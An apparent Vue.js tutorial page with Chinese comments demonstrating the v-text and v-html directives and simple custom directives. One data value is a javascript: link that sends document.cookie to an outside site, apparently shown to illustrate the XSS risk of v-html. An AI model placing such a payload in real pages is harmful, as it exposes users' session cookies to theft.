<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>内置指令</title>
    <script type="text/javascript" src="../JS/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h3 v-text="name">v-text会覆盖掉标签之间的内容</h3>
      <h3 v-text="str">dsadsada</h3>
      <h3 v-html="herf1"></h3>
      <button @click="n++">点我n+1=====>{{n}}</button>
      <h3>n放大10倍<span v-big="n">放大</span></h3>
    </div>
  </body>
  <script>
    new Vue({
      el: "#root",
      data: {
        n: 0,
        name: "lyh",
        str: "<h2>v-text不解析标签<h2>",
        herf1:
          '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我',
      },
      methods: {},
      // 自定义指令
      directives: {
        // big函数何时会被调用?1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时.

        big(element, binding) {
          element.innerText = binding.value * 10;
        },
        fbind: {
          //指令与元素国功绑定时(一上来)

          bind() {},
          //指令所在元素被插入页面时

          inserted() {},
          //指令所在的模板被重新解析时

          update() {},
        },
      },
    });
  </script>
</html>
